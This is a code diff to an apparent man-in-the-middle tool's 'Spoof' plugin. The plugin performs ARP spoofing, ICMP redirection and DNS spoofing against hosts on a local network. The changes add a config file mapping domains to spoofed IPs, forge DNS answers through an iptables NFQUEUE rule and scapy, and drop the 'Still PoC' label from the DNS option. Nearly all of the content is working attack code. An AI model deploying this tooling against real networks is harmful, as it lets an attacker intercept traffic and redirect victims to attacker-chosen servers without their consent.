@@ -14,6 +14,11 @@ import os
 import sys
 import threading
 
+try:
+    from configobj import ConfigObj
+except:
+    sys.exit('[-] configobj library not installed!')
+
 class Spoof(Plugin):
     name = "Spoof"
     optname = "spoof"
@@ -29,12 +34,11 @@ class Spoof(Plugin):
         self.dns = options.dns
         self.domain = options.domain
         self.dnsip = options.dnsip
+        self.dnscfg = options.dnscfg
         self.gateway = options.gateway
-        self.routermac = getmacbyip(self.gateway)
         self.summary = options.summary
         self.target = options.target
         self.arpmode = options.arpmode
-        self.mac = get_if_hwaddr(self.interface)
         self.port = self.options.listen
         self.debug = False
         self.send = True
@@ -53,8 +57,10 @@ class Spoof(Plugin):
                 sys.exit("[-] --arp and --icmp are mutually exclusive")
 
             if (not self.interface or not self.gateway):
-                sys.exit("[-] ARP Spoofing requires --gateway and --interface")
-            
+                sys.exit("[-] ARP Spoofing requires --gateway and --iface")
+
+            self.mac = get_if_hwaddr(self.interface)
+            self.routermac = getmacbyip(self.gateway)
             print "[*] ARP Spoofing enabled"
             if self.arpmode == 'req':
                 pkt = self.build_arp_req()
@@ -66,8 +72,10 @@ class Spoof(Plugin):
                 sys.exit("[-] --icmp and --arp are mutually exclusive")
 
             if (not self.interface or not self.gateway or not self.target):
-                sys.exit("[-] ICMP Redirection requires --gateway, --interface and --target")
+                sys.exit("[-] ICMP Redirection requires --gateway, --iface and --target")
             
+            self.mac = get_if_hwaddr(self.interface)
+            self.routermac = getmacbyip(self.gateway)
             print "[*] ICMP Redirection enabled"
             pkt = self.build_icmp()
 
@@ -80,8 +88,11 @@ class Spoof(Plugin):
                 sys.exit(0)
 
         if self.dns == True:
-            if (not self.dnsip or not self.domain):
-                sys.exit("[-] DNS Spoofing requires --domain and --dnsip")
+            if not self.dnscfg:
+                if (not self.dnsip or not self.domain):
+                    sys.exit("[-] DNS Spoofing requires --domain, --dnsip")
+            elif self.dnscfg:
+                self.dnscfg = ConfigObj(self.dnscfg)
             
             os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE')
             print "[*] DNS Spoofing enabled"
@@ -137,18 +148,17 @@ class Spoof(Plugin):
         if not pkt.haslayer(DNSQR):
             payload.set_verdict(nfqueue.NF_ACCEPT)
         else:
-            #if self.spoofall:
-                #if not self.redirectto:
-                    #self.spoofed_pkt(payload, pkt, localIP)
-                #else:
-                    #self.spoofed_pkt(payload, pkt, self.redirectto)
-            if self.domain in pkt[DNS].qd.qname:
-                self.modify_dns(payload, pkt)
+            if self.dnscfg:
+                for k,v in self.dnscfg.items():
+                    if k in pkt[DNS].qd.qname:
+                        self.modify_dns(payload, pkt, v)
+            elif self.domain in pkt[DNS].qd.qname:
+                self.modify_dns(payload, pkt, self.dnsip)
 
-    def modify_dns(self, payload, pkt):
+    def modify_dns(self, payload, pkt, ip):
         spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                       UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
-                      DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=self.dnsip))
+                      DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=ip))
 
         payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(spoofed_pkt), len(spoofed_pkt))
         logging.info("%s Spoofed DNS packet for %s" % (pkt[IP].src, pkt[DNSQR].qname[:-1]))
@@ -176,7 +186,7 @@ class Spoof(Plugin):
     def add_options(self,options):
         options.add_argument('--arp', dest='arp', action='store_true', default=False, help='Redirect traffic using ARP Spoofing')
         options.add_argument('--icmp', dest='icmp', action='store_true', default=False, help='Redirect traffic using ICMP Redirects')
-        options.add_argument('--dns', dest='dns', action='store_true', default=False, help='Redirect DNS requests (Still PoC)')
+        options.add_argument('--dns', dest='dns', action='store_true', default=False, help='Redirect DNS requests')
         #options.add_argument('--dhcp')
         options.add_argument('--iface', dest='interface', help='Specify the interface to use')
         options.add_argument('--gateway', dest='gateway', help='Specify the gateway IP')
@@ -185,6 +195,7 @@ class Spoof(Plugin):
         options.add_argument('--summary', action='store_true', dest='summary', default=False, help='Show packet summary and ask for confirmation before poisoning')
         options.add_argument('--domain', type=str, dest='domain', help='Domain to spoof [e.g google.com]')
         options.add_argument('--dnsip', type=str, dest='dnsip', help='IP address to resolve dns queries to')
+        options.add_argument("--dnscfg", type=file, help="Specify a config file")
 
     def finish(self):
         self.send = False
@@ -194,6 +205,10 @@ class Spoof(Plugin):
         file.write('0')
         file.close()
         os.system('iptables -F && iptables -X && iptables -t nat -F && iptables -t nat -X')
+
+        if self.dns == True:
+            self.q.unbind(socket.AF_INET)
+            self.q.close()
         
         if self.arp == True:
             print '[*] Re-arping network'
